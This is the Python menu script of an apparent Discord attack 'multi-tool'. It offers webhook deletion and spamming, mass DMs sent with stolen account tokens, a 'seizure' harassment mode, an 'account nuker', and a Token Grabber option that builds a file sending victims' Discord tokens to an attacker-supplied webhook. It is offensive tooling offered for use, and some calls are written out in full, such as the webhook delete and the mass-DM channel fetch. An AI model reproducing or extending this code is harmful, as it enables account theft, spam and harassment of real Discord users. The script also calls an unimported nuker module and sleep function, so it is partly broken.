# Multi Tool v1
# Don't Skid!
# Made by Starlinkboy#0159
# https://github.com/starlinkboy/Carnage-Multi-tool-v1

from util.plugins.common import *
import threading, time
from pystyle import *
from colorama import Fore
from pystyle import Colorate, Colors
import multiprocessing
import keyboard
import util.massreport
import util.accountinfo
import util.TokenGrabber
import util.seizure
import util.Webhook_Spammer_Deleter
import util.massdm

threads = 3
cancel_key = "ctrl+x"


logo2 = "github.com/starlinkboy | Starlinkboy #0159"
def main():

 logo = """


                  ███╗   ███╗██╗   ██╗██╗  ████████╗██╗   ████████╗ ██████╗  ██████╗ ██╗           Github: github.com/starlinkboy/
                  ████╗ ████║██║   ██║██║  ╚══██╔══╝██║   ╚══██╔══╝██╔═══██╗██╔═══██╗██║           Discord: Starlinkboy#0159
                  ██╔████╔██║██║   ██║██║     ██║   ██║█████╗██║   ██║   ██║██║   ██║██║           Multi-Tool v1
                  ██║╚██╔╝██║██║   ██║██║     ██║   ██║╚════╝██║   ██║   ██║██║   ██║██║           Made with
                  ██║ ╚═╝ ██║╚██████╔╝███████╗██║   ██║      ██║   ╚██████╔╝╚██████╔╝███████╗      Love❌ Code✅
                  ╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝   ╚═╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
                                                                           

  """

 opti = """
 [1] Webhook Destroyer               [4] Account Info  
 [2] Mass Dm                         [5] Token Grabber 
 [3] Seizure                         [6] Account Nuker
 """

 print(Colorate.Horizontal(Colors.purple_to_blue, f"{logo}"))
 time.sleep(1.5)
 print(Colorate.Horizontal(Colors.purple_to_blue, f"{opti}"))


 choice = input(Colorate.Horizontal(Colors.purple_to_blue,'Choice: '))

 if choice == '1':
        print(f'''
    {Fore.RESET}[{Fore.RED}1{Fore.RESET}] Webhook Deleter
    {Fore.RESET}[{Fore.RED}2{Fore.RESET}] Webhook Spammer    
                        ''')
        secondchoice = int(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Second Choice: {Fore.RED}'))
        if secondchoice not in [1, 2]:
            print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Invalid Second Choice')
            sleep(1)
            main()
        if secondchoice == 1:
            WebHook = input(
                f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Webhook: {Fore.RED}')
            validateWebhook(WebHook)
            try:
                requests.delete(WebHook)
                print(f'\n{Fore.GREEN}Webhook Successfully Deleted!{Fore.RESET}\n')
            except Exception as e:
                print(f'{Fore.RED}Error: {Fore.WHITE}{e} {Fore.RED}happened while trying to delete the Webhook')

            input(f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Enter anything to continue. . . {Fore.RED}')
            main()
        if secondchoice == 2:
            WebHook = input(
                f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Webhook: {Fore.RED}')
            validateWebhook(WebHook)
            Message = str(input(
                f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Message: {Fore.RED}'))
            util.Webhook_Spammer_Deleter.WebhookSpammer(WebHook, Message)

 elif choice == '2':
        token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        message = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Message that will be sent to every friend: {Fore.RED}'))
        processes = []
        channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
        if not channelIds:
            print(f"{Fore.RESET}No Dms Found")
            sleep(3)
            main()
        for channel in [channelIds[i:i+3] for i in range(0, len(channelIds), 3)]:
            t = threading.Thread(target=util.massdm.MassDM, args=(token, channel, message))
            t.start()
            processes.append(t)
        for process in processes:
            process.join()
        input(f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Enter anything to continue. . . {Fore.RED}')
        sleep(1.5)
        main()
 
 elif choice == '3':
        token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        print(f'{Fore.MAGENTA}Starting seizure mode {Fore.RESET}{Fore.WHITE}(Switching on/off Light/dark mode){Fore.RESET}\n')
        SlowPrint(f"{Fore.RED}{cancel_key}{Fore.RESET} at anytime to stop")
        processes = [] 
        for i in range(threads):
            t = multiprocessing.Process(target=util.seizure.StartSeizure, args=(token, ))
            t.start()
            processes.append(t)
        while True:
            if keyboard.is_pressed(cancel_key):
                for process in processes:
                    process.terminate()
                main()
                break

 elif choice == '4':
        token = input(
        f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        util.accountinfo.Info(token)


 elif choice == '5':
        WebHook = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Webhook Url: {Fore.RED}')
        validateWebhook(WebHook)
        fileName = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}File name: {Fore.RED}'))
        util.TokenGrabber.TokenGrabberV2(WebHook, fileName)

 elif choice == "6":
    token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
    validateToken(token)

    Server_Name = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Name of the servers that will be created: {Fore.RED}'))
        
    message_Content = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Message that will be sent to every friend: {Fore.RED}'))

    if threading.active_count() < threads:
            threading.Thread(target=util.nuker.Hazard_Nuke, args=(token, Server_Name, message_Content)).start()
 
 else:
  print("Invalid Option!!")
  main()

main()